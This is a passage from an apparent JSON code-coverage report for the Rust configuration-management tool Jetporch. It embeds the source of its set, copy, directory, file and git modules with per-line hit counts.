std::sync::{Arc};\n\n\nconst MODULE: \u0026str = \"Set\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct SetTask {\n    pub name: Option\u003cString\u003e,\n    pub vars: Option\u003cserde_yaml::Mapping\u003e, \n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e,\n\n}\nstruct SetAction {\n    pub vars: Option\u003cserde_yaml::Mapping\u003e, \n}\n\n\nimpl IsTask for SetTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(SetAction {\n                    vars: self.vars.clone() /* templating will happen below */\n                }),\n                with: Arc::new(PreLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.and)?),\n            }\n        );\n    }\n\n}\n\nimpl IsAction for SetAction {\n    \n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n    \n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n                return Ok(handle.response.needs_passive(\u0026request));\n            },\n\n            TaskRequestType::Passive =\u003e {\n                \n                /* so far this only templates top level strings, which is probably sufficient, rather than strings found in deeper levels */\n\n                let mut mapping = serde_yaml::Mapping::new();\n                if self.vars.as_ref().is_some() {\n                    for (k,v) in self.vars.as_ref().unwrap().iter() {\n                        if v.is_string() {\n                            let ks = v.as_str().unwrap().to_string();\n                            let vs = v.as_str().unwrap().to_string();\n                            let templated = handle.template.string_unsafe_for_shell(request, TemplateMode::Strict, \u0026ks.clone(), \u0026vs)?;\n                            mapping.insert(k.clone(), serde_yaml::Value::String(templated));\n                        } else {\n                            mapping.insert(k.clone(), v.clone());\n                        }   \n                    }\n                }\n\n                handle.host.write().unwrap().update_variables(mapping);\n                return Ok(handle.response.is_passive(\u0026request));\n            \n            }\n\n            _ =\u003e { return Err(handle.response.not_supported(request)); }\n\n        }\n    }\n\n}\n\n","traces":[{"line":41,"address":[],"length":0,"stats":{"Line":2}},{"line":42,"address":[],"length":0,"stats":{"Line":2}},{"line":43,"address":[],"length":0,"stats":{"Line":1}},{"line":45,"address":[],"length":0,"stats":{"Line":0}},{"line":46,"address":[],"length":0,"stats":{"Line":0}},{"line":47,"address":[],"length":0,"stats":{"Line":0}},{"line":48,"address":[],"length":0,"stats":{"Line":0}},{"line":49,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":61,"address":[],"length":0,"stats":{"Line":0}},{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":66,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":92,"address":[],"length":0,"stats":{"Line":0}}],"covered":3,"coverable":25},{"path":["/","Users","wings","projects","jetpack","src","modules","files","copy.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::handle::handle::TaskHandle;\nuse crate::tasks::fields::Field;\nuse std::path::{PathBuf};\nuse serde::{Deserialize};\nuse std::sync::Arc;\nuse std::vec::Vec;\nuse crate::tasks::files::Recurse;\n\nconst MODULE: \u0026str = \"copy\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct CopyTask {\n    pub name: Option\u003cString\u003e,\n    pub src: String,\n    pub dest: String,\n    pub attributes: Option\u003cFileAttributesInput\u003e,\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e\n}\nstruct CopyAction {\n    pub src: PathBuf,\n    pub dest: String,\n    pub attributes: Option\u003cFileAttributesEvaluated\u003e,\n}\n\nimpl IsTask for CopyTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        let src = handle.template.string(\u0026request, tm, \u0026String::from(\"src\"), \u0026self.src)?;\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(CopyAction {\n                    src:        handle.template.find_file_path(request, tm, \u0026String::from(\"src\"), \u0026src)?,\n                    dest:       handle.template.path(\u0026request, tm, \u0026String::from(\"dest\"), \u0026self.dest)?,\n                    attributes: FileAttributesInput::template(\u0026handle, \u0026request, tm, \u0026self.attributes)?\n                }),\n                with: Arc::new(PreLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.and)?),\n            }\n        );\n    }\n\n}\n\nimpl IsAction for CopyAction {\n\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n    \n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n\n                let mut changes : Vec\u003cField\u003e = Vec::new();\n                let remote_mode = handle.remote.query_common_file_attributes(request, \u0026self.dest, \u0026self.attributes, \u0026mut changes, Recurse::No)?;                   \n                if remote_mode.is_none() {\n                    return Ok(handle.response.needs_creation(request));\n                }\n                // this query leg is (at least originally) the same as the template module query except these two lines\n                // to calculate the checksum differently\n                let src_path = self.src.as_path();\n                let local_512 = handle.local.get_sha512(request, \u0026src_path, true)?;\n                let remote_512 = handle.remote.get_sha512(request, \u0026self.dest)?;\n                if ! remote_512.eq(\u0026local_512) { \n                    changes.push(Field::Content); \n                }\n                if ! changes.is_empty() {\n                    return Ok(handle.response.needs_modification(request, \u0026changes));\n                }\n                return Ok(handle.response.is_matched(request));\n            },\n\n            TaskRequestType::Create =\u003e {\n                self.do_copy(handle, request, None)?;               \n                return Ok(handle.response.is_created(request));\n            },\n\n            TaskRequestType::Modify =\u003e {\n                if request.changes.contains(\u0026Field::Content) {\n                    self.do_copy(handle, request, Some(request.changes.clone()))?;\n                }\n                else {\n                    handle.remote.process_common_file_attributes(request, \u0026self.dest, \u0026self.attributes, \u0026request.changes, Recurse::No)?;\n                }\n                return Ok(handle.response.is_modified(request, request.changes.clone()));\n            },\n    \n            _ =\u003e { return Err(handle.response.not_supported(request)); }\n    \n        }\n    }\n\n}\n\nimpl CopyAction {\n\n    pub fn do_copy(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, _changes: Option\u003cVec\u003cField\u003e\u003e) -\u003e Result\u003c(), Arc\u003cTaskResponse\u003e\u003e {\n        handle.remote.copy_file(request, \u0026self.src, \u0026self.dest, |f| { /* after save */\n            match handle.remote.process_all_common_file_attributes(request, \u0026f, \u0026self.attributes, Recurse::No) {\n                Ok(_x) =\u003e Ok(()), Err(y) =\u003e Err(y)\n            }\n        })?;\n        return Ok(());\n    }\n\n}\n","traces":[{"line":46,"address":[],"length":0,"stats":{"Line":2}},{"line":47,"address":[],"length":0,"stats":{"Line":1}},{"line":48,"address":[],"length":0,"stats":{"Line":1}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":55,"address":[],"length":0,"stats":{"Line":0}},{"line":56,"address":[],"length":0,"stats":{"Line":0}},{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":60,"address":[],"length":0,"stats":{"Line":0}},{"line":69,"address":[],"length":0,"stats":{"Line":0}},{"line":71,"address":[],"length":0,"stats":{"Line":0}},{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":91,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":121,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}}],"covered":3,"coverable":36},{"path":["/","Users","wings","projects","jetpack","src","modules","files","directory.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::handle::handle::TaskHandle;\nuse crate::tasks::fields::Field;\nuse crate::tasks::files::Recurse;\nuse serde::{Deserialize};\nuse std::sync::Arc;\nuse std::vec::Vec;\n\nconst MODULE: \u0026str = \"directory\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct DirectoryTask {\n    pub name: Option\u003cString\u003e,\n    pub path: String,\n    pub remove: Option\u003cString\u003e,\n    pub recurse: Option\u003cString\u003e,\n    pub attributes: Option\u003cFileAttributesInput\u003e,\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e\n}\nstruct DirectoryAction {\n    pub path: String,\n    pub remove: bool,\n    pub recurse: Recurse,\n    pub attributes: Option\u003cFileAttributesEvaluated\u003e,\n}\n\nimpl IsTask for DirectoryTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        let recurse = match handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"recurse\"), \u0026self.recurse)? {\n            true =\u003e Recurse::Yes,\n            false =\u003e Recurse::No\n        };\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(DirectoryAction {\n                    remove:     handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"remove\"), \u0026self.remove)?,\n                    recurse:    recurse, \n                    path:       handle.template.path(\u0026request, tm, \u0026String::from(\"path\"), \u0026self.path)?,\n                    attributes: FileAttributesInput::template(\u0026handle, \u0026request, tm, \u0026self.attributes)?\n                }),\n                with: Arc::new(PreLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.and)?),\n            }\n        );\n    }\n\n}\n\nimpl IsAction for DirectoryAction {\n\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n    \n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n                let mut changes : Vec\u003cField\u003e = Vec::new();\n                let remote_mode = handle.remote.query_common_file_attributes(request, \u0026self.path, \u0026self.attributes, \u0026mut changes, self.recurse)?;                 \n                if remote_mode.is_none() {\n                    if self.remove             { return Ok(handle.response.is_matched(request)); } \n                    else                       { return Ok(handle.response.needs_creation(request));  }\n                } else {\n                    let is_file = handle.remote.get_is_file(request, \u0026self.path)?;\n                    if is_file                 { return Err(handle.response.is_failed(request, \u0026format!(\"{} is not a directory\", self.path))); }\n                    else if self.remove        { return Ok(handle.response.needs_removal(request)); }\n                    else if changes.is_empty() { return Ok(handle.response.is_matched(request)); }\n                    else                       { return Ok(handle.response.needs_modification(request, \u0026changes)); }\n                }\n            },\n\n            TaskRequestType::Create =\u003e {\n                handle.remote.create_directory(request, \u0026self.path)?;               \n                handle.remote.process_all_common_file_attributes(request, \u0026self.path, \u0026self.attributes, self.recurse)?;\n                return Ok(handle.response.is_created(request));\n            },\n\n            TaskRequestType::Modify =\u003e {\n                handle.remote.process_common_file_attributes(request, \u0026self.path, \u0026self.attributes, \u0026request.changes, self.recurse)?;\n                return Ok(handle.response.is_modified(request, request.changes.clone()));\n            },\n\n            TaskRequestType::Remove =\u003e {\n                handle.remote.delete_directory(request, \u0026self.path, self.recurse)?;               \n                return Ok(handle.response.is_removed(request))\n            }\n\n            // no passive or execute leg\n            _ =\u003e { return Err(handle.response.not_supported(request)); }\n\n        \n        }\n    }\n}","traces":[{"line":47,"address":[],"length":0,"stats":{"Line":2}},{"line":48,"address":[],"length":0,"stats":{"Line":1}},{"line":49,"address":[],"length":0,"stats":{"Line":1}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":54,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":60,"address":[],"length":0,"stats":{"Line":0}},{"line":61,"address":[],"length":0,"stats":{"Line":0}},{"line":62,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":65,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}}],"covered":3,"coverable":33},{"path":["/","Users","wings","projects","jetpack","src","modules","files","file.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::handle::handle::TaskHandle;\nuse crate::tasks::fields::Field;\nuse serde::{Deserialize};\nuse std::sync::Arc;\nuse std::vec::Vec;\nuse crate::tasks::files::Recurse;\n\nconst MODULE: \u0026str = \"file\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct FileTask {\n    pub name: Option\u003cString\u003e,\n    pub path: String,\n    pub remove: Option\u003cString\u003e,\n    pub attributes: Option\u003cFileAttributesInput\u003e,\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e\n}\nstruct FileAction {\n    pub path: String,\n    pub remove: bool,\n    pub attributes: Option\u003cFileAttributesEvaluated\u003e,\n}\n\nimpl IsTask for FileTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(FileAction {\n                    remove:     handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"remove\"), \u0026self.remove)?,\n                    path:       handle.template.path(\u0026request, tm, \u0026String::from(\"path\"), \u0026self.path)?,\n                    attributes: FileAttributesInput::template(\u0026handle, \u0026request, tm, \u0026self.attributes)?\n                }),\n                with: Arc::new(PreLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.and)?),\n            }\n        );\n    }\n\n}\n\nimpl IsAction for FileAction {\n\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n    \n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n                let mut changes : Vec\u003cField\u003e = Vec::new();\n                let remote_mode = handle.remote.query_common_file_attributes(request, \u0026self.path, \u0026self.attributes, \u0026mut changes, Recurse::No)?;                   \n                if remote_mode.is_none() {\n                    if self.remove             { return Ok(handle.response.is_matched(request)); } \n                    else                       { return Ok(handle.response.needs_creation(request));  }\n                } else {\n                    let is_dir = handle.remote.get_is_directory(request, \u0026self.path)?;\n                    if is_dir                  { return Err(handle.response.is_failed(request, \u0026format!(\"{} is a directory\", self.path))); }\n                    else if self.remove        { return Ok(handle.response.needs_removal(request)); }\n                    else if changes.is_empty() { return Ok(handle.response.is_matched(request)); }\n                    else                       { return Ok(handle.response.needs_modification(request, \u0026changes)); }\n                }\n            },\n\n            TaskRequestType::Create =\u003e {\n                handle.remote.touch_file(request, \u0026self.path)?;               \n                handle.remote.process_all_common_file_attributes(request, \u0026self.path, \u0026self.attributes, Recurse::No)?;\n                return Ok(handle.response.is_created(request));\n            },\n\n            TaskRequestType::Modify =\u003e {\n                handle.remote.process_common_file_attributes(request, \u0026self.path, \u0026self.attributes, \u0026request.changes, Recurse::No)?;\n                return Ok(handle.response.is_modified(request, request.changes.clone()));\n            },\n\n            TaskRequestType::Remove =\u003e {\n                handle.remote.delete_file(request, \u0026self.path)?;               \n                return Ok(handle.response.is_removed(request))\n            }\n\n            // no passive or execute leg\n            _ =\u003e { return Err(handle.response.not_supported(request)); }\n\n        \n        }\n    }\n}\n","traces":[{"line":45,"address":[],"length":0,"stats":{"Line":2}},{"line":46,"address":[],"length":0,"stats":{"Line":1}},{"line":47,"address":[],"length":0,"stats":{"Line":1}},{"line":49,"address":[],"length":0,"stats":{"Line":0}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":54,"address":[],"length":0,"stats":{"Line":0}},{"line":55,"address":[],"length":0,"stats":{"Line":0}},{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":58,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":69,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}}],"covered":3,"coverable":32},{"path":["/","Users","wings","projects","jetpack","src","modules","files","git.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::handle::handle::TaskHandle;\nuse crate::tasks::fields::Field;\nuse serde::{Deserialize};\nuse std::sync::Arc;\nuse std::vec::Vec;\nuse crate::tasks::files::Recurse;\nuse std::collections::HashMap;\n\nconst MODULE: \u0026str = \"git\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct GitTask {\n    pub name: Option\u003cString\u003e,\n    pub repo: String,\n    pub path: String,\n    pub branch: Option\u003cString\u003e,\n    pub ssh_options: Option\u003cHashMap\u003cString,String\u003e\u003e,\n    pub accept_keys: Option\u003cString\u003e,\n    pub update: Option\u003cString\u003e,\n    pub attributes: Option\u003cFileAttributesInput\u003e,\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e\n}\n\nstruct GitAction {\n    pub repo: String,\n    pub path: String,\n    pub branch: String,\n    pub ssh_options: Vec\u003cString\u003e,\n    pub accept_keys: bool,\n    pub update: bool,\n    pub attributes: Option\u003cFileAttributesEvaluated\u003e,\n}\n\nimpl IsTask for GitTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(GitAction {\n                    repo:         handle.template.string(\u0026request, tm, \u0026String::from(\"repo\"), \u0026self.repo)?,\n                    path:         handle.template.path(\u0026request, tm, \u0026String::from(\"path\"), \u0026self.path)?,\n                    branch:       handle.template.string_option_default(\u0026request, tm, \u0026String::from(\"branch\"), \u0026self.branch, \u0026String::from(\"main\"))?,\n                    accept_keys:  handle.template.boolean_option_default_true(\u0026request, tm, \u0026String::from(\"accept_keys\"), \u0026self.accept_keys)?,\n                    update:       handle.template.boolean_option_default_true(\u0026request, tm, \u0026String::from(\"update\"), \u0026self.update)?,\n                    attributes:   FileAttributesInput::template(\u0026handle, \u0026request, tm, \u0026self.attributes)?,\n                    ssh_options:  {\n                        let mut options : Vec\u003cString\u003e = Vec::new();\n                        match \u0026self.ssh_options {\n                            Some(input_options) =\u003e {\n                                for (k,v) in input_options.iter() {\n                                    options.push(format!(\"-o {}={}\", k, v))\n                                }\n                            },\n                            _ =\u003e {}\n                        };\n                        options.push(String::from(\"-o BatchMode=Yes\"));\n                        options\n                    }\n                }),\n                with: Arc::new(PreLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.and)?),\n            }\n        );\n    }\n\n}\n\nimpl IsAction for GitAction {\n\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n    \n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n\n                let mut changes : Vec\u003cField\u003e = Vec::new();\n                // see if the remote directory exists\n                let remote_mode = handle.remote.query_common_file_attributes(request, \u0026self.path, \u0026self.attributes, \u0026mut changes, Recurse::Yes)?;                 \n\n                match remote_mode {\n                    // the directory does not exist, need to make everything happen\n                    None =\u003e Ok(handle.response.needs_creation(request)),\n\n                    // the directory does exist, but the .git directory might not, or it might need to change versions/branches\n                    // so more checking needed...\n                    _ =\u003e {\n                        \n                        let git_path = match self.path.ends_with(\"/\") {\n                            // could have used pathbuf, but ... anyway ...\n                            true =\u003e format!(\"{}{}\", self.path, String::from(\".git\")),\n                            false =\u003e format!(\"{}/{}\", self.path, String::from(\".git\")),\n                        };\n\n                        match handle.remote.get_mode(request, \u0026git_path)? {\n\n                            // the repo does not exist, so do everything\n                            None =\u003e Ok(handle.response.needs_creation(request)),\n\n                            // the repo does exist, see what needs to change depending on parameters\n                            // minor FIXME: this module does not currently deal with repo URLs changing\n                            // when a git directory has already been checked out at a given location\n                            _ =\u003e {\n                                let local_version = self.get_local_version(handle, request)?;\n                                if local_version.is_none() {\n                                    changes.push(Field::Version);\n                                }\n                                else {\n                                    let remote_version = self.get_remote_version(handle, request)?;\n                                    let local_branch = self.get_local_branch(handle, request)?;\n                                    if self.update \u0026\u0026 (! remote_version.eq(\u0026local_version.unwrap())) {\n                                        changes.push(Field::Version);\n                                    }\n                                    if ! local_branch.eq(\u0026self.branch) {\n                                        changes.push(Field::Branch);\n                                    }\n                                }\n\n                                if changes.len() \u003e 0 {\n                                    Ok(handle.response.needs_modification(request, \u0026changes))\n                                } else {\n                                    Ok(handle.response.is_matched(request))\n\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n                \n            TaskRequestType::Create =\u003e {\n                handle.remote.create_directory(request, \u0026self.path)?;\n                handle.remote.process_all_common_file_attributes(request, \u0026self.path, \u0026self.attributes, Recurse::Yes)?;\n                self.clone(handle, request)?;\n                self.switch_branch(handle, request)?;                           \n                return Ok(handle.response.is_created(request));\n            },\n\n            TaskRequestType::Modify =\u003e {\n\n                handle.remote.process_common_file_attributes(request, \u0026self.path, \u0026self.attributes, \u0026request.changes, Recurse::Yes)?;\n                if request.changes.contains(\u0026Field::Branch) || request.changes.contains(\u0026Field::Version) {\n                    self.pull(handle,request)?;\n                }\n                if 